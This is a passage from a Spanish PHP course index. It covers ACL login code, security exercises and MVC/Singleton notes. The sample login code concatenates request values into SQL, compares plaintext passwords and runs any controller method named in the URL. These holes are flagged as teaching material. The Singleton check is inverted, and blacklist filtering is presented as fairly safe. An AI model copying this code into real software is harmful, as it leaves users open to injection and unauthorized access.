muestro algunos datos de ejemplo para que quede más claro de lo que estamos hablando): . TABLA users . | id | email | passwd | name | telef | etc (otros campos) | . | 1 | pepe@iescelia.org | 1234 | Pepe Pérez | 555 230 111 | etc | . | 2 | ana@iescelia.org | 1234 | Ana López | 555 398 234 | etc | . | Etc | Etc | Etc | Etc | Etc | Etc | . TABLA roles . | id | description | . | 1 | Admin | . | 2 | Editor | . | 3 | User | . TABLA roles-users . | idUser | idRol | . | 1 | 1 | . | 2 | 2 | . | 2 | 3 | . | etc | etc | . TABLA permissions . | id | description | action | . | 1 | Crear contenido nuevo | createContentForm | . | 2 | Editar contenido propio | editMyContentForm | . | 3 | Editar contenido ajeno | editAnyContentForm | . | 4 | Borrar contenido propio | deleteMyContentForm | . | 5 | Borrar contenido ajeno | deleteAnyContentForm | . | 6 | Publicar contenido propio | publishMyContentForm | . | 7 | Publicar contenido ajeno | publishAnyContentForm | . | 8 | Leer contenido publicado | readContent | . TABLA permissions-roles . | idRol | idPermission | . | 1 | 1 | . | 1 | 2 | . | 1 | 3 | . | 1 | 4 | . | 1 | 5 | . | 1 | 6 | . | 1 | 7 | . | 1 | 8 | . | 2 | 1 | . | 2 | 2 | . | 2 | 6 | . | 2 | 8 | . | 3 | 8 | . Observa que, con estas tablas, queda perfectamente definido a qué perfil de usuario (o “rol”) pertenece cada usuario y qué cosas puede hacer con ese perfil. Por ejemplo, el usuario Pepe Pérez, que tiene el Id = 1, es un Administrador, porque tiene asociado el rol 1 en la tabla roles-users. Y los administradores tienen permiso para hacerlo absolutamente todo, según se desprende de la tabla permissions-roles. En cambio, la usuaria Ana López (Id = 2) tiene perfil de Editor, y los editores solo tienen permiso para cuatro operaciones: Crear contenido nuevo, Editar su propio contenido, Publicar su propio contenido y Leer el contenido publicado. Código fuente de nuestra implementación . En esta implementación, no escribiremos el código para hacer cosas como “Crear contenido nuevo” o “Publicar contenido”. Eso dependerá del sistema concreto que estemos programando, y no es lo que nos interesa ahora. Lo que nos interesa es ver cómo se autentica un usuario en una aplicación web y cómo se le puede dar acceso a unas funcionalidades o a otras dependiendo del contenido de las tablas ACL. Una vez autenticado, el usuario accederá a una vista diferente de la aplicación dependiendo de sus privilegios, donde se le mostrarán las opciones de que dispone. Es decir, si el usuario que se loguea es Pepe Pérez, que tiene rol de Administrador, la aplicación debe mostrarle estas opciones: . | Editar contenido (propio y ajeno) | Borrar contenido (propio y ajeno) | Publicar contenido (propio y ajeno) | Leer contenido | Crear contenido | . En cambio, si se loguea Ana López, que tiene dos perfiles, la aplicación le dará a elegir cuál quiere usar. Si elige el perfil de Editor, las opciones deben reducirse a: . | Editar contenido (propio) | Publicar contenido (propio) | Leer contenido | Crear contenido | . Cada una de estas opciones redirigirá la aplicación de regreso a index.php, con un valor diferente para la variable action que se pasará por la URL. Ese valor se saca de la tabla permissions. Insisto en una idea muy importante: no es necesario que comprendas la totalidad de este código en este momento. Basta con que te esfuerces en captar la idea general. Volverás sobre él, y sobre infinitas variedades de él, más adelante, cada vez con mayor comprensión de lo que está sucediendo. Así que léelo sin prisa y sin agobios, como quien se adentra en la traducción de un texto escrito en una lengua que se parece un poco a la suya sin llegar a serlo. Una última advertencia: esta solución presenta algunos problemas de seguridad (como no filtrar las variables procedentes de un formulario) que resolveremos en los ejercicios propuestos más adelante. Archivo index.php . Este archivo captura la variable action desde la URL. Esta variable, como ya vimos en el ejemplo de la Biblioteca, indica a la aplicación qué es lo que debe hacer. Luego se instancia un objeto de tipo Controller y se invoca un método con el mismo nombre que la action. &lt;?php include(\"controller.php\"); $controller = new Controller(); // Miramos a ver si hay alguna acción pendiente de realizar if (!isset($_REQUEST['action'])) { // No la hay. Usamos la acción por defecto (mostrar el formulario de login) $action = \"showLoginForm\"; } else { // Sí la hay. La recuperamos. $action = $_REQUEST['action']; } // Ejecutamos el método del controlador que se llame como la acción $controller-&gt;$action(); . CONTROLADOR (archivo controller.php) . En el controlador están reflejadas todas las posibles acciones que puede realizar la aplicación. Es decir, tiene que haber un método por cada posible valor de la variable action. &lt;?php include (\"view.php\"); include (\"user.php\"); class Controller { private $view, $user; /** * Constructor. Crea el objeto vista y los modelos */ public function __construct() { session_start(); // Si no se ha hecho en el index, claro $this-&gt;view = new View(); // Vistas $this-&gt;user = new User(); // Modelo de usuarios } /** * Muestra el formulario de login */ public function showLoginForm() { $this-&gt;view-&gt;show(\"loginForm\"); } /** * Procesa el formulario de login y, si es correcto, inicia la sesión con el id del usuario. * Redirige a la vista de selección de rol. */ public function processLoginForm() { // Validación del formulario if ($_REQUEST['email'] == \"\" || $_REQUEST['pass'] == \"\") { // Algún campo del formulario viene vacío: volvemos a mostrar el login $data['errorMsg'] = \"El email y la contraseña son obligatorios\"; $this-&gt;view-&gt;show(\"loginForm\", $data); } else { // Hemos pasado la validación del formulario: vamos a procesarlo $userData = $this-&gt;user-&gt;checkLogin($_REQUEST['email'], $_REQUEST['pass']); if ($userData!=null) { // Login correcto: creamos la sesión y pedimos al usuario que elija su rol $_SESSION['idUser'] = $userData-&gt;id; $this-&gt;SelectUserRolForm(); } else { $data['errorMsg'] = \"Usuario o contraseña incorrectos\"; $this-&gt;view-&gt;show(\"loginForm\", $data); } } } /** * Muestra formulario de selección de rol de usuario */ public function selectUserRolForm() { $data['roles'] = $this-&gt;user-&gt;getUserRoles($_SESSION['idUser']); $this-&gt;view-&gt;show(\"selectUserRolForm\", $data); // Posible mejora: si el usuario solo tiene un rol, la aplicación podría seleccionarlo automáticamnte // y saltar a $this-&gt;showMainMenu() } /** * Procesa el formulario de selección de rol de usuario y crea una variable de sesión para almacenarlo. * Redirige al menú principal. */ public function processSelectUserRolForm() { $_SESSION['userRol'] = $_REQUEST['idRol']; $this-&gt;showMainMenu(); } /** * Muestra el menú de opciones del usuario según la tabla de persmisos */ public function showMainMenu() { $data['permissions'] = $this-&gt;user-&gt;getUserPermissions($_SESSION['userRol']); $this-&gt;view-&gt;show(\"mainMenu\", $data); } } . VISTA (view.php) . Este archivo contiene un método genérico (dentro de la clase View) para mostrar cualquier otra vista, cuyo nombre se le pasa como parámetro desde el controlador. &lt;?php class View { public function show($viewName, $data = null) { include(\"views/header.php\"); include(\"views/$viewName.php\"); include(\"views/footer.php\"); } } . VISTA loginForm (archivo views/loginForm.php) . Esta vista muestra el formulario de login. La dejamos preparada para mostrar, opcionalmente, un mensaje de error (del tipo “usuario o contraseña incorrectos”) o un mensaje informativo (del tipo “Sesión cerrada con éxito”). &lt;?php if (isset($data['errorMsg'])) { echo \"&lt;p style='color:red'&gt;\" . $data['errorMsg'] . \"&lt;/p&gt;\"; } if (isset($data['infoMsg'])) { echo \"&lt;p style='color:blue'&gt;\" . $data['infoMsg'] . \"&lt;/p&gt;\"; } echo \"&lt;form action='index.php'&gt; Email:&lt;input type='text' name='email'&gt;&lt;br&gt; Contraseña:&lt;input type='password' name='pass'&gt;&lt;br&gt; &lt;input type='hidden' name='action' value='processLoginForm'&gt; &lt;input type='submit'&gt; &lt;/form&gt;\"; . VISTA selectUserRolForm (archivo views/selectUserRolForm.php) . Esta vista muestra la lista de roles de un usuario. Sirve por si un usuario tiene asignado más de un rol. Así, antes de terminar el login, podrá elegir con qué rol quiere ingresar en la aplicación. &lt;?php echo \"Selecciona el rol&lt;br&gt;\"; echo \"&lt;form action='index.php'&gt;\"; echo \"&lt;select name='idRol'&gt;\"; foreach ($data['roles'] as $rol) { echo \"&lt;option value='\".$rol-&gt;id.\"'&gt;\".$rol-&gt;description.\"&lt;option&gt;\"; } echo \"&lt;/select&gt;\"; echo \"&lt;input type='hidden' name='action' value='processSelectUserRolForm'&gt;\"; echo \"&lt;button type='submit'&gt;Enviar&lt;/button&gt;\"; echo \"&lt;/form&gt;\"; . VISTA mainMenu (archivo views/mainMenu.php) . Esta vista muestra las opciones del programa asociadas a un usuario concreto. Cada opción es un enlace a la propia aplicacion con un valor diferente para la variable action. &lt;?php echo \"Menú principal&lt;br&gt;\"; foreach ($data['permissions'] as $permission) { echo \"&lt;a href='index.php?action=\" . $permission-&gt;action . \"'&gt;\" . $permission-&gt;description . \"&lt;/a&gt;&lt;br&gt;\"; } . MODELO (archivo user.php) . El modelo contiene todos los métodos necesarios para acceder a la base de datos (o, en general, a cualquier recurso del servidor). Esos métodos siempre se invocan desde el controlador. En este caso, llamamos user.php al modelo porque accederá únicamente a la tabla de usuarios. &lt;?php class User { private $db; /** * Constructor de la clase. * Crea una conexión con la base de datos y la asigna a la variable $this-&gt;db */ public function __construct() { $this-&gt;db = new mysqli(\"servidor\", \"usuario\", \"contraseña\", \"base-de-datos\"); } /** * Comprueba si un email y una password pertenecen a algún usuario de la base de datos. * @param String $email El email del usuario que se quiere comprobar * @param String $pass La contraseña del usuario que se quiere comprobar * @return User $usuario Si el usuario existe, devuelve un objeto con todos los campos del usuario en su interior. Si no, devuelve un objeto null */ public function checkLogin($email, $pass) { if ($result = $this-&gt;db-&gt;query(\"SELECT id FROM users WHERE email = '$email' AND password = '$pass'\")) { if ($result-&gt;num_rows == 1) { $usuario = $result-&gt;fetch_object(); return $usuario; } else { return null; } } else { return null; } } /** * Busca en la base de datos la lista de roles de un usuario * @param integer $idUser El id del usuario * @return array $resultArray Un array con todos los roles del usuario, o null si el usuario no existe o no tiene roles asignados */ public function getUserRoles($idUser) { $resultArray = array(); if ($result = $this-&gt;db-&gt;query(\"SELECT roles.* FROM roles INNER JOIN `roles-users` ON roles.id = `roles-users`.idRol WHERE `roles-users`.idUser = '$idUser'\")) { if ($result-&gt;num_rows &gt; 0) { while ($rol = $result-&gt;fetch_object()) { $resultArray[] = $rol; } return $resultArray; } else { return null; } } else { return null; } } /** * Busca en la base de datos los permisos asociados a un rol * @param integer $idRol El id del rol * @return array $resultArray Un array con la lista de permisos asociados al rol, o null si el rol no existe o no tiene permisos asociados */ public function getUserPermissions($idRol) { $resultArray = array(); if ($result = $this-&gt;db-&gt;query(\"SELECT permissions.* FROM permissions INNER JOIN `permissions-roles` ON permissions.id = `permissions-roles`.idPermission WHERE `permissions-roles`.idRol = '$idRol'\")) { if ($result-&gt;num_rows &gt; 0) { while ($permission = $result-&gt;fetch_object()) { $resultArray[] = $permission; } return $resultArray; } else { return null; } } else { return null; } } } ?&gt; . ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/autenticacion-mediante-acl.html#35-autenticaci%C3%B3n-mediante-acl",
    "relUrl": "/cookies-sesiones-seguridad/autenticacion-mediante-acl.html#35-autenticación-mediante-acl"
  },"29": {
    "doc": "3.5 Autenticación mediante ACL",
    "title": "3.5 Autenticación mediante ACL",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/autenticacion-mediante-acl.html",
    "relUrl": "/cookies-sesiones-seguridad/autenticacion-mediante-acl.html"
  },"30": {
    "doc": "3.6 Ejercicios propuestos",
    "title": "3.6. Ejercicios propuestos",
    "content": "Vamos a enfilar el final de este tema con una batería de ejercicios propuestos, que consistirán en una serie de mejoras sobre nuestra implementación de las listas de control de acceso. Ten en cuenta que lo que hagas aquí se puede reutilizar en posteriores proyectos de aplicaciones web, así que vamos a tomárnoslo en serio, ¿te parece? . Como vamos a trabajar con la implementación anterior, tal vez te apetezca ponerla a funcionar en tu servidor local. El código fuente lo puedes copiar de este mismo documento. Para que no tengas que construir la base de datos a mano, puedes usar este archivo SQL para importarla en tu servidor local. Ejercicio 1. Crear la capa de seguridad . Si te fijas en el código fuente, hemos accedido en varios puntos al array superglobal $_SESSION. Más arriba dijimos que las variables de sesión de PHP no son completamente seguras. Confiar nuestro mecanismo de autenticación a esas variables es como jugar a la ruleta rusa. ¿Y si queremos cambiarlo? Por ejemplo, por cookies. Vale, las cookies tampoco son muy seguras, pero la pregunta sigue siendo la misma: ¿y si queremos cambiar la forma en la que se almacena el ID del usuario logueado tras la autenticación? . La única manera es revisar TOOOODO el código fuente y cambiar las referencias a $_SESSION por $_COOKIE (o el mecanismo que hayamos elegido para sustituir a las variables de sesión). Y, si pretendemos mejorar la seguridad de la aplicación, no solo sustituirla, lo mismo: ponte a revisar todo tu código una y otra vez. Por eso suele construirse una capa de seguridad. Que es lo que te propongo hacer ahora. La capa de seguridad no es más que una clase (podemos llamarla Seguridad o Security) guardada en un archivo aparte que contendrá una colección de métodos para gestionar la seguridad de la aplicación. Así, cada vez que queramos cambiar algo en la forma se protege de los ataques, solo tendremos que acudir a esa clase y tocar aquí o allí, como en una intervención quirúrjica muy localizada. Así que, en este ejercicio, te pido crear una clase Seguridad (o Security) que contenga, para empezar, estos métodos: . | openSession(): para abrir una sesión de usuario cuando alguien se loguee correctamente. Este método seguirá usando una variable de sesión de PHP (ya lo cambiaremos después). Por ahora, solo queremos centralizar en esta clase el manejo de sesiones y seguridad. | getUserId(): devuelve el ID del usuario logueado (si existe). | getUserRoles(): devuelve un array con los roles del usuario logueado (si existe) | getUserPermissions(): devuelve un array con los permisos del usuario logueado (si existe) | . Cuando tengas hecha esa clase, sustituye cualquier referencia a $_SESSION en el código fuente de nuestro caso práctico (ver sección anterior) por llamadas a métodos de esta clase, hasta que el programa funcione exactamente igual que antes, pero con la clase Seguridad integrada en él. Ejercicio 2. Filtrar los datos de entrada . Añade un nuevo método en la clase Seguridad que puedes llamar filter(). Este método recibirá un string y lo devolverá filtrado, es decir, limpio de cualquier carácter o palabra sospechosa. Puedes empezar por eliminar los caracteres especiales como “&lt;”, “&gt;”, “#” o “$”, señal de que alguien puede estar intentando inyectar Javascript, SQL o tratando de atacar mediante CSRF. Con eso ya irás bastante seguro. Luego busca todos los puntos de la aplicación donde se accede a las variables de la URL sin filtro (es decir, los puntos donde se usa $_REQUEST, $_GET o $_POST) y llama al método filter() antes de acceder a esas variables. Más adelante, puedes mejorar la función de filtrado localizando palabras como “script”, “location.href” o similares. Lo bueno de esta solución es que no tendrás que tocar el resto del programa: al tener la función de filtrado encapsulada en la clase Seguridad, cualquier mejora posterior afectará a toda la aplicación sin modificar el código externo a esta clase. Ejercicio 3. Cerrar la sesión y destruir las variables . Es algo que no hemos hecho hasta ahora, ¿verdad? . La clase Seguridad debe tener un método para destruir las variables de sesión y cerrar la sesión de un usuario autenticado. Lo podemos llamar closeSession(). Habrá que añadir una opción “Cerrar sesión” en el menú principal de la aplicación que enlace con una entrada del controlador que, a su vez, invoque este método de la clase Seguridad. Ejercicio 4. Añadir cookies para controlar la sesión . Hemos dicho a lo largo del texto que manejar las sesiones de usuario solo con las variables de sesión de PHP es arriesgado, puesto que un atacante podría suplantar la sesión con relativa facilidad capturando la cookie “phpsessid”. Para proporcionar a este mecanismo un extra de protección, se pueden crear cookies adicionales que nos den una pista en caso de que se produzca un ataque. Estas cookies se manipulan desde la clase Seguridad de forma transparente al resto del programa. Es decir, el resto de clases ni se enteran de que la seguridad de la aplicación se está incrementando. ¡Es la magia de la programación orientada a objetos! . Las cookies que vamos a crear en este punto son: . | idUsuario: Guardaremos el id del usuario logueado en una cookie además de en una variable de sesión. Cada vez que la clase Seguridad vaya a comprobar algo (los permisos del usuario, por ejemplo), se asegurará de que la cookie y la variable de sesión contienen exactamente el mismo valor. Cualquier discrepancia provocará un cierre de la sesión inmediato. | idRol: Haremos lo mismo con el rol del usuario. | myToken: Será una cookie con un valor aleatorio que guardaremos en el cliente, al mismo tiempo que crearemos una variable de sesión donde se guardará el mismo valor. Si un atacante suplanta el id de sesión de PHP, probablemente no suplantará este token. En cada operación de la clase Seguridad comprobaremos que los dos tokens coinciden y, si no es así, cerraremos la sesión. | . Ejercicio 5. Añadir una tabla para controlar la sesión . El mecanismo extra de seguridad que hemos implementado en el apartado anterior no es suficiente. Un atacante avispado se percatará antes o después de que hay por ahí pululando una cookie adicional (nuestro token), y terminará suplantándolo. Para subir un escalón en nuestra protección frente a ataques, necesitamos crear una tabla en la base de datos que tenga más o menos esta estructura: . CREATE TABLE IF NOT EXISTS `MySessions` ( `id` varchar(40) NOT NULL, `ipAddress` varchar(45) NOT NULL, `idUser` INTEGER NOT NULL, `idRol` INTEGER NOT NULL, `token` varchar(200) NOT NULL, `timestamp` int(10) unsigned DEFAULT 0 NOT NULL, PRIMARY KEY (id) ); . Cuando un usuario de autentique en la aplicación, crearemos sus variables de sesión y sus cookies como hasta ahora y, además, insertaremos un registro en la tabla MySessions con toda la información de la sesión, a la que añadiremos: . | La IP desde la que el cliente se ha conectado. Curiosea en internet para averiguar cómo se puede obtener este dato. | La fecha y hora exacta de esa conexión (a eso se le denomina timestamp o marca de tiempo). | . En cualquier operación posterior, la clase Seguridad realizará todas las comprobaciones que ya realizaba hasta ahora y, además, lanzará una consulta a la base de datos para recuperar, mediante el valor del token, el ID del usuario y su rol. Si el token no existe en la base de datos, mal asunto: cerramos la sesión. Y si hay cualquier discrepancia entre los valores de la base de datos, de las variables de sesión y de las cookies, mal asunto también: cerramos la sesión. La seguridad puede continuar mejorándose indefinidamente. Por ejemplo: si detectamos un posible ataque procedente de una dirección IP, podemos pasarla a una tabla de “direcciones baneadas” e impedir cualquier intento de conexión en el futuro desde esa dirección. Ejercicio 6. Limitar el acceso al controlador (y completar la aplicación) . Todo esto está muy bien (aunque te hace volverte un poco paranoico, ¿verdad?), pero, por muchas mejoras en la seguridad que estemos introduciendo, cualquier atacante, incluso sin pasar por el login, puede escribir esto en su navegador y meterse hasta la cocina en nuestra aplicación: . https://mi-servidor/index.php?action=showMainMenu . Sustituye “showMainMenu” por cualquier otra cosa (¿qué tal “deleteUser”?) y tienes un problema de los gordos. Para programar una aplicación web segura necesitamos proteger los métodos del controlador, de manera que solo pueda ejecutarlos un usuario autenticado y con los privilegios adecuados. Fíjate en que cada usuario tendrá acceso a diferentes métodos del controlador, dependiendo de su rol. Por ejemplo, a un método como showMainMenu() podrá acceder cualquier usuario logueado, pero un método como deleteUser() debe estar más limitado y solo los administradores deberían poder ejecutarlo. Así que tienes que añadir una barrera de entrada en cada método del controlador, en forma de un par de líneas de código que comprueben: . a) Que hay un usuario correctamente autenticado. b) Que ese usuario tiene privilegios suficientes para ejecutar este método. Las dos comprobaciones se hacen invocando métodos de la clase Seguridad. Te dejo a ti pensar cómo se implementa esto exactamente (en realidad, hay varios modos). Si cualquiera de las dos comprobaciones falla, el usuario verá una pantalla de “Acceso prohibido” o algo por el estilo. Ejercicio 7. Actualizar periódicamente el ID de sesión . Una técnica de defensa frecuente es modificar el ID de sesión periódicamente (cada pocos minutos, o bien cada vez que se recibe una petición del cliente). Implementa esta opción en tu aplicación. Te advierto que es lo más complicado que has hecho hasta ahora. Puedes considerar que este es un ejercicio de nivel avanzado. Ejercicio 8. Aplicar a un caso realista . Por último, vamos a aplicar todas estas mejoras en la seguridad a una aplicación web más completa. Para ello, utiliza el código fuente de tu Videoclub (la aplicación que programamos en el tema anterior). Si no dispones de ese código, puedes usar el de la Biblioteca. Lo encontrarás en un capítulo anterior de este mismo texto. No es que sea una aplicación muy completa, pero si te servirá para comprobar que la capa de seguridad es muy eficaz contra los ataques más habituales. Añade la clase Seguridad al código fuente de tu aplicación y sustituye la apertura de la sesión por llamadas a los métodos de la clase Seguridad. Por último, protege todos los accesos al controlador para asegurarte de que solo los usuarios con los privilegios adecuados puede ejecutar ese código. Y una última advertencia: por mucho que protejas una aplicación web, puedes encontrarte con atacantes que burlen tus medidas de seguridad. La única solución para eso es disponer siempre de un backup de tu código y tu base de datos para restaurarlo todo en caso de catástrofe, así que no dejes de hacer copias con frecuencia (o contrata un proveedor de hosting que las haga por ti). ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/ejercicios-propuestos.html#36-ejercicios-propuestos",
    "relUrl": "/cookies-sesiones-seguridad/ejercicios-propuestos.html#36-ejercicios-propuestos"
  },"31": {
    "doc": "3.6 Ejercicios propuestos",
    "title": "3.6 Ejercicios propuestos",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/ejercicios-propuestos.html",
    "relUrl": "/cookies-sesiones-seguridad/ejercicios-propuestos.html"
  },"32": {
    "doc": "3.7 Ejercicios resueltos",
    "title": "3.7. Ejercicios resueltos",
    "content": "Aquí puedes descargar el código fuente de la aplicación con listas de control de acceso (ACL) que hemos trabajado en clase. Incluye una capa de seguridad muy sencilla (hecha con variables de sesión de PHP) y una capa de abstracción de datos. | Descargar el código fuente | Descargar la base de datos (con algunos datos de prueba) | . Todas las modificaciones que vayamos haciendo en clase se subirán de nuevo a estos archivos para que siempre dispongas de las versiones más actualizadas del código. ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/ejercicios-resueltos.html#37-ejercicios-resueltos",
    "relUrl": "/cookies-sesiones-seguridad/ejercicios-resueltos.html#37-ejercicios-resueltos"
  },"33": {
    "doc": "3.7 Ejercicios resueltos",
    "title": "3.7 Ejercicios resueltos",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/ejercicios-resueltos.html",
    "relUrl": "/cookies-sesiones-seguridad/ejercicios-resueltos.html"
  },"34": {
    "doc": "3 Cookies, sesiones y seguridad",
    "title": "3. Cookies, sesiones y seguridad",
    "content": "En este capítulo vamos a profundizar en varios aspectos de PHP de vital importancia para las aplicaciones web. Por un lado, tenemos las cookies y las sesiones, dos mecanismos que permiten a la aplicación mantener vivas algunas variables de forma indefinida. Después estudiaremos un problema endémico a las aplicaciones web: la seguridad. En efecto, al tratarse de aplicaciones que, por definición, están permanentemente conectadas a la red, son susceptibles de recibir ataques de manera continua e indiscriminada. Y, de hecho, lo hacen. Veremos cuáles son los tipos de ataque más frecuente y cómo podemos proteger nuestra aplicación contra ellos, algo en lo que juegan un papel importante las cookies y las variables de sesión. Por último, nos centraremos en algo muy relacionado con la seguridad: la autenticación de usuarios para acceder a la aplicación. La mayor parte de las aplicaciones web necesitan un mecanismo seguro de autenticación. Veremos en qué consisten las listas de control de acceso y plantearemos una implementación muy completa en la que pondremos en práctica todo lo que hemos aprendido hasta ahora e incluso iremos un paso más allá al introducir la arquitectura MVC, que veremos en el siguiente tema. ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/#3-cookies-sesiones-y-seguridad",
    "relUrl": "/cookies-sesiones-seguridad/#3-cookies-sesiones-y-seguridad"
  },"35": {
    "doc": "3 Cookies, sesiones y seguridad",
    "title": "3 Cookies, sesiones y seguridad",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/",
    "relUrl": "/cookies-sesiones-seguridad/"
  },"36": {
    "doc": "4 Arquitectura MVC",
    "title": "4. Arquitectura MVC",
    "content": ". | 4.1. Patrones de software . | 4.1.1. Tipos de patrones | 4.1.2. Ejemplo de patrón: el patrón Singleton | . | 4.2. Arquitectura de una aplicación web . | 4.2.1. Arquitecturas FÍSICAS multicapa (multitier) | 4.2.2. Arquitecturas LÓGICAS multicapa (multilayer) | 4.2.3. Ventajas de las arquitecturas multicapa | . | 4.3. La arquitectura Modelo-Vista-Controlador (MVC) . | 4.3.1. ¿Qué es el MVC? | 4.3.2. MVC en la práctica: una implementación incremental | . | 4.4. El patrón MVC en la teoría | 4.5. Ejercicios propuestos | . En ingeniería del software, como en cualquier otra ingeniería, existen una serie de soluciones estandarizadas que se ajustan sorprendentemente bien a una enorme variedad de situaciones diferentes. Estas soluciones se denominan patrones de software, y vamos a empezar este tema hablando de ellas. Después nos centraremos en los patrones de arquitectura, y sobre todo en uno en concreto denominado MVC o Modelo-Vista-Controlador que tiene una enorme importancia en el ámbito de las aplicaciones web. Pero, antes de meternos a saco con el patrón MVC, tendremos que darle un par de vueltas al término “arquitectura”, porque, en el ámbito de las aplicaciones web, se usa con dos significados distintos que conviene que tengas claros para no hacerte un lío. Terminaremos el tema mostrando, como siempre, un ejemplo de código bastante basado en la arquitectura MVC, de modo que puedas usarlo para comprender mejor los conceptos teóricos y como base para tus propios proyectos. ",
    "url": "https://iescelia.org/docs/dwes/_site/mvc/#4-arquitectura-mvc",
    "relUrl": "/mvc/#4-arquitectura-mvc"
  },"37": {
    "doc": "4 Arquitectura MVC",
    "title": "4.1. Patrones de software",
    "content": "Antes de entrar en la parte más práctica de todo este asunto, es decir, antes de que veamos los patrones de arquitectura y los apliquemos en un ejemplo concreto de aplicación web, tienes que dejarme que te hable de los patrones de software. Los patrones de software son soluciones comprobadas a problemas comunes en el desarrollo de software. La arquitectura MVC, de hecho, es un patrón, porque se ha probado infinidad de veces y se adapta a la perfección a multitud de problemas diferentes. Para que un patrón pueda considerarse tal cosa, tiene que cumplir estas condiciones: . | Debe haber sido comprobado en otros sistemas. | Debe ser fácilmente reutilizable. | Debe ser aplicable a diferentes circunstancias. | Debe estar bien documentado. | . 4.1.1. Tipos de patrones . Dependiendo del grado de abstracción del patrón, existen patrones de diverso tipo: . | De arquitectura | De diseño | De creación de objetos | De estructura de clases | De comportamiento | De dialectos | De interacción o interfaz de usuario | De análisis | De dominio | . 4.1.2. Ejemplo de patrón: el patrón Singleton . Antes de centrarnos en el patrón MVC, vamos a ver, solo a modo de ejemplo, otro tipo de patrón: el patrón Singleton, que está considerado un patrón de diseño. Algunos recursos en una aplicación son de tal naturaleza que sólo puede existir una instancia de ese tipo de recurso. Por ejemplo, la conexión a la base de datos a través de un manejador de base de datos. A veces interesa compartir un manejador de base de datos para que el resto de recursos no tengan que conectarse y desconectarse continuamente de la BD, y sólo debería existir una instancia de ese manejador. El patrón Singleton cubre esta necesidad. Un objeto es “singleton” si la aplicación puede generar una y sólo una instancia del mismo. Esta es una implementación sencilla y reutilizable de ese patrón. Utiliza un constructor privado para evitar que se creen varias instancias del objeto y un método static para obtener la única instancia permitida. Ojo, que solo se trata de un ejemplo. De hecho, ni siquiera está completo, porque en PHP hay varias formas de construir un objeto sin pasar por el constructor. No te lo tomes como algo que tengas que aprenderte de memoria o algo así. Lo interesante de este ejemplo es que veas que existen muchos patrones que pueden (y, de hecho, deben) reutilizarse una y otra vez en el diseño de aplicaciones. class Singleton { private static $instancia; // Referencia a la única instancia de este objeto. Es private // para que nadie pueda usarla desde fuera del objeto // Constructor privado. Nadie podrá crear objetos desde fuera de la clase. private function __construct() { $this-&gt;contador = 0; } // Este método comprueba si existe ya una instancia del objeto Singleton. // Si existe, la devuelve. Si no existe, la crea antes de devolverla. public static function getInstance() { if ( self::$instancia instanceof self) { self::$instancia = new self; } return self::$instancia; } } ?&gt; . Teniendo una clase como esa, el objeto Singleton puede usarse de este modo: . // Las dos variables contendrán, en realidad, el mismo objeto Singleton $single1 = Singleton::getInstance(); $single2 = Singleton::getInstance(); . Por supuesto, a la clase Singleton podemos añadirle todos los métodos que necesitemos, como a cualquier clase, sin que pierda su condición de Singleton. ",
    "url": "https://iescelia.org/docs/dwes/_site/mvc/#41-patrones-de-software",
    "relUrl": "/mvc/#41-patrones-de-software"
  },"38": {
    "doc": "4 Arquitectura MVC",
    "title": "4.2. Arquitectura de una aplicación web",
    "content": "Ahora que tenemos claro qué es un patrón de software, vamos a centrarnos en los patrones de arquitectura. Pero existe un problema cuando hablamos de “arquitectura de una aplicación” en el ámbito de las aplicaciones web. El problema es este: usamos el término “arquitectura de una aplicación” para referirnos a dos cosas distintas: la arquitectura física y la arquitectura lógica. Vamos a intentar explicar la diferencia. 4.2.1. Arquitecturas FÍSICAS multicapa (multitier) . Una arquitectura física de varios niveles (multinivel o multitier, en inglés) consiste en un conjunto de ordenadores conectados a una red que ejecutan de forma conjunta una aplicación. El ejemplo más sencillo es la arquitectura cliente-servidor, la más popular en aplicaciones web sencillas: una máquina cliente y una máquina servidor ejecutan alternativamente fragmentos del código, proporcionando al usuario final la sensación de una aplicación unificada. Por supuesto, nada impide que tengamos más de dos máquinas colaborando en red para ejecutar una aplicación web. Podemos tener, por ejemplo, un cliente, un servidor web y un servidor de bases de datos (estos dos últimos en dos máquinas físicas diferentes). Esto sería una arquitectura de 3 niveles físicos. Esta arquitectura se puede generalizar. Una con N niveles físicos tendría este aspecto: . La arquitectura física es algo que incumbe sobre todo a los administradores de sistemas, que son los encargados de montarla, configurarla y mantenerla. Para el programador, sin embargo, suele resultar transparente. Por ejemplo, cuando nos conectamos a un servidor de bases de datos desde nuestra aplicación, poco importa que ese servidor esté en la misma máquina física o en otra máquina diferente: la forma de conectarse y operar con la base de datos es exactamente la misma. Así que la arquitectura física, siendo importante, no lo es demasiado para nosotros y nosotras como desarrolladores. En cambio, la arquitectura lógica es otra historia… . 4.2.2. Arquitecturas LÓGICAS multicapa (multilayer) . Ahora viene la vuelta de tuerca: la arquitectura de una aplicación también puede referirse a sus capas (layers en inglés) lógicas. Es decir, a las capas de software que nosotros, los desarrolladores/as, creamos. Dividir una aplicación en capas que colaboran entre sí por medio de interfaces bien definidos no es una idea nueva, ni pertenece exclusivamente al ámbito de la programación web. Pero la mayor parte de las aplicaciones web hacen uso de este mecanismo de abstracción. La idea es fragmentar nuestra aplicación en capas de niveles de abstracción cada vez mayor. En un extremo, la capa más abstracta es la que interacciona con el usuario: ahí se implementará nuestro interfaz de usuario, o lo que en aplicaciones web se llama front-end. En el otro extremo, la capa menos abstracta es la que está en contacto con el hardware de la máquina. Bueno, en el caso de una aplicación web, no hay contacto directo con el harware, sino con otras capas aún menos abstractas que están fuera de nuestra aplicación, como el sistema operativo, el servidor web o el gestor de bases de datos. Esas capas externas a nuestra aplicación son las que, realmente, interaccionan con el hardware en última instancia. Esta división en capas de abstracción, que puede parecer una complicación innecesaria, tiene un montón de ventajas y por eso se usa en cualquier aplicación un poco más complicada que “Hola, mundo”. 4.2.3. Ventajas de las arquitecturas multicapa . Las arquitecturas multicapa permiten varias cosas que no pueden hacerse con los códigos monolíticos. Entre otras: . | Desarrollar en paralelo cada capa (mayor rapidez de desarrollo). | 